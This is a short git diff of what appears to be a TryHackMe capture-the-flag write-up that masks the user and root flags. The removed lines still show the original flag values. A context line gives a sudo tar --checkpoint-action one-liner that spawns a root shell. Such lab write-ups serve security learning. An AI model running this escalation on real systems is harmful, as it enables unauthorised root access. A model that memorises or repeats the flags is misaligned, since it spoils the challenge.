@@ -54,7 +54,7 @@ Answer: ssh
 
 ## user.txt:
 ```
-Answer: THM{CR1M3_SyNd1C4T3}
+Answer: THM{********************}
 ```
 
 ## priv esc
@@ -67,7 +67,7 @@ sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
 
 ## root.txt:
 ```
-Answer: THM{80UN7Y_h4cK3r}
+Answer: THM{********************}
 
 ```
 
